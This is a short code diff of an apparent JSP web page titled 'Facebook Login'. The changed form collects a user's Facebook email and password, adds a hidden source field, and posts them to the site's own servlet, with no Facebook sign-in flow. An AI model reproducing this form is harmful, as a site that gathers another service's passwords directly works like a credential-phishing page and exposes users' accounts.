@@ -12,11 +12,12 @@
 <div class="container">
     <h2>Facebook Login</h2>
     <hr>
-    <form action="index.jsp" method="POST"> 
-        <input type="text" name="facebookUser" placeholder="Facebook Username" required><br>
-        <input type="password" name="facebookPassword" placeholder="Facebook Password" required><br>
-        <input type="submit" value="Log in with Facebook">
-    </form>
+    <form action="SocialLoginServlet" method="POST">
+    <input type="text" name="email" placeholder="Facebook Email" required><br>
+    <input type="hidden" name="source" value="facebook">
+    <input type="password" name="password" placeholder="Facebook Password" required><br>
+    <input type="submit" value="Log in with Facebook">
+</form>
     <a href="Login.jsp">Return to Login</a> 
 </div>
 
